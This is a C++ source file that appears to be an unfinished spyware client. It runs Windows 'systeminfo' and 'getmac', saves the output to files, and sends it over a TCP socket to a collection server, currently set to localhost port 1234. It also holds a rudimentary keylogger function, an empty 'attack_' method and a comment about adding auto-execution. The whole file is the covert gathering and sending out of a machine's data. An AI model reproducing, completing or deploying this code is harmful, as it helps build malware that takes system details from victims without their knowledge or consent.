#include <iostream>
#include <boost/asio.hpp>
#include <fstream>
#include <Windows.h>
using namespace boost::asio;
using ip::tcp;
using std::string;
using std::cout;
using std::endl;

class ClientMainClass {
protected:
    void attack_() {

    }
private:
    bool key_log(int _key = VK_ESCAPE)
   {
         if (GetAsyncKeyState(_key) == -32767)
            {
                std::cout << "hvgjvg"; // beep
                return true;
            }
            return false;
    }
    void shipment_message_mac() {
        system("getmac > D:\\InfoMac.txt");
        boost::asio::io_service io_service;
        //socket creation
        tcp::socket socket(io_service);
        //connection
        socket.connect(tcp::endpoint(boost::asio::ip::address::from_string("127.0.0.1"), 1234));
        // request/message from client

   

        std::ifstream fileMac("D:\\InfoMac.txt");
        fileMac.open("D:\\InfoMac.txt");
        std::stringstream st;
        st << fileMac.rdbuf();
        std::string str_(st.str());
        const string ius = str_;

        const string msg = "connectened in remote machine \n";
        boost::system::error_code error;
     
        boost::asio::write(socket, boost::asio::buffer(ius), error);

        if (error) {
            cout << "send failed: " << error.message() << endl;
        }
        // getting response from server
        boost::asio::streambuf receive_buffer;
        boost::asio::read(socket, receive_buffer, boost::asio::transfer_all(), error);
        if (error && error != boost::asio::error::eof) {
            cout << "receive failed: " << error.message() << endl;
        }
        else {
            const char* data = boost::asio::buffer_cast<const char*>(receive_buffer.data());
            cout << data << endl;
        }
    }
    void shipment_message_info() {
        boost::asio::io_service io_service;
        //socket creation
        tcp::socket socket(io_service);
        //connection
        socket.connect(tcp::endpoint(boost::asio::ip::address::from_string("127.0.0.1"), 1234));
        // request/message from client
       
           std:: ifstream file("D:\\Info.txt");
        file.open("D:\\Info.txt");
        std::stringstream ss;
        ss << file.rdbuf();
        std::string str(ss.str());
        const string iu = str;

        std::ifstream fileMac("D:\\InfoMac.txt");
        fileMac.open("D:\\InfoMac.txt");
        std::stringstream st;
        st << fileMac.rdbuf();
        std::string str_(st.str());
        const string ius = str_;

        const string msg = "connectened in remote machine \n";
        boost::system::error_code error;
        boost::asio::write(socket, boost::asio::buffer(iu), error);
        boost::asio::write(socket, boost::asio::buffer(ius), error);
     
        if(error) {
            cout << "send failed: " << error.message() << endl;
        }
        // getting response from server
        boost::asio::streambuf receive_buffer;
        boost::asio::read(socket, receive_buffer, boost::asio::transfer_all(), error);
        if (error && error != boost::asio::error::eof) {
            cout << "receive failed: " << error.message() << endl;
        }
        else {
            const char* data = boost::asio::buffer_cast<const char*>(receive_buffer.data());
            cout << data << endl;
        }
    }
    
public:
    void execute() {
        shipment_message_info();
        shipment_message_mac();
      
       
   }
    void getInfo() {
        setlocale(LC_ALL, "Russian");
        system("systeminfo > D:\\Info.txt");
        system("getmac > D:\\InfoMac.txt");
        
    }
};

int main() {
    //add autoexecute 
    ClientMainClass obj;
    setlocale(LC_ALL, "Russian");
    obj.getInfo();
    obj.execute();
    return 0;
}
